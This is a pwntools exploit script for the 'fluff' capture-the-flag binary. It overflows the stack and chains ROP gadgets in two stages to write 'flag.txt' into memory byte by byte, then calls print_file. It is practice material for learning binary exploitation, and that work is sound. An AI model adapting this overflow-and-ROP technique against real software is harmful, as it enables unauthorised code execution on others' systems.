from pwn import *
import sys

binary = './fluff'
if len(sys.argv) == 2:
    r = gdb.debug([binary], '''
    b *0x40060b
    ''')
else:
    r = process([binary])

def write_byte_at_addrs_to(addrs, where):
    set_al_from_rbx = 0x400628
    pop_rdx_rcx_set_rbx = 0x40062a
    write_al_at_rdi = 0x400639
   
    set_eax_0_pop_rbp = 0x400610

    pop_rdi = 0x4006a3
    rdx_val = 0xffffffffffffff00
    rcx_min = 0x3ef2

    chain = ''
    for i, addr in enumerate(addrs):
        addr = addr - rcx_min
        # Set rbx to our addr
        chain += p64(pop_rdx_rcx_set_rbx) + p64(rdx_val) + p64(addr)

        # Move [rbx] byte in al
        chain += p64(set_eax_0_pop_rbp) + p64(123456)
        chain += p64(set_al_from_rbx)

        # Move al at [rdi]
        chain += p64(pop_rdi) + p64(where + i)
        chain += p64(write_al_at_rdi)

    return chain

# [f,l,a,g,.,t,x,t]
addresses = [0x4005f6, 0x400239, 0x4005d2, 0x4003cf, 0x4005f7, 0x400674, 0x400248, 0x400674]

where_write = 0x601028
print_file_addr = 0x400510
ret_addr = 0x400616
pop_rdi = 0x4006a3
pwnme_addr = 0x400500


# First chain
chain = write_byte_at_addrs_to(addresses[:5], where_write)
chain += p64(pwnme_addr)

payload = 'A' * cyclic_find('kaaalaaa') + chain
r.sendline(payload)

# Second chain
chain = write_byte_at_addrs_to(addresses[5:], where_write + 5)
chain += p64(pop_rdi) + p64(where_write)
chain += p64(print_file_addr)

payload = 'A' * cyclic_find('kaaalaaa') + chain
r.sendline(payload)


r.interactive()

